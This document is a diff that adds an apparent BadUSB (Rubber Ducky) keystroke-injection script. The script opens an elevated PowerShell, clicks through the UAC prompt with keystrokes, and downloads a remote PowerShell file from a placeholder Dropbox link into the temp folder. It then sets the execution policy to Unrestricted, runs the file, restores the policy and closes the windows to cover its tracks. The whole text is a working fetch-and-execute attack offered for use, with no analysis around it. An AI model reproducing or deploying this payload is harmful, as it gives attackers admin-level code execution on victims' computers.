@@ -1,0 +1,58 @@
+DELAY 500
+GUI r
+DELAY 200
+
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING Start-Process powershell -Verb runAs
+ENTER
+DELAY 200 
+TAB
+DELAY 200 
+TAB
+DELAY 200 
+ENTER
+
+DELAY 1000
+STRING $fileUrl = "insert your dropbox.com download link"
+ENTER
+DELAY 200
+
+STRING $destinationPath = "$env:TEMP\main.ps1"
+ENTER
+DELAY 200
+
+STRING Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath 
+ENTER
+DELAY 300
+
+STRING cd $env:TEMP
+ENTER
+DELAY 400
+
+STRING Set-ExecutionPolicy Unrestricted
+ENTER
+DELAY 400
+STRING y
+ENTER
+DELAY 400
+
+STRING ./main.ps1
+ENTER
+DELAY 1000
+
+STRING Set-ExecutionPolicy restricted
+ENTER
+DELAY 400
+STRING y
+ENTER
+DELAY 400
+STRING exit
+ENTER
+DELAY 200
+ALT-TAB
+DELAY 400
+STRING exit
+ENTER
